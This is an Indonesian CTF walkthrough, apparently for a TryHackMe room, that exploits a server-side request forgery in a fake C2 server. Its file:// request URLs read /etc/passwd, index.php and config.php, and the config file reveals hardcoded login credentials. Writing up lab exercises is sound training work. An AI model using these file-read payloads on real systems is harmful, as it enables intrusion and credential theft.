scan dengan rustscan
```

```

tambahkan host
```
sudo vim /etc/hosts
...
127.0.0.1       ***
127.0.0.1       ***
IP-target		mcgreedysecretc2.thm
```

buka `http://mcgreedysecretc2.thm`. C2 server ini diproteksi dengan login form, namun terdapat link dokumentasi untuk akses c2 dengan API, kita dapat menggunakannya.

gunakan ssrf untuk mengakses file-file yang ada di server.
```
http://IP-target/getClientData.php?url=file:////////etc/passwd
...
ubuntu:x:1000:1000:...
...
```

karena sudah dapat dipastikan bisa untuk mengakses file `/etc/passwd`, maka kita bisa coba untuk akses `index.php`
```
http://IP-target/getClientData.php?url=file:////////var/www/html/index.php
...
<?php
session_start();
include('config.php');

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the submitted username and password
  
  $uname = $_POST["username"];
    $pwd = $_POST["password"];

    if ($uname === $username && $pwd === $password) {

```

dari file `index.php`, kita dapat lihat terdapat file `config.php`, jadi kita dapat coba untuk lihat isinya
```
http://IP-target/getClientData.php?url=file:////////var/www/html/config.php
...
$username = "mcgreedy";
$password = "mcgreedy!@#$%";
...
```

dan ternyata berisi creds `mcgreedy:mcgreedy!@#$%`. Kita dapat menggunakan creds tersebut untuk login ke C2 server dan mendapatkan flag.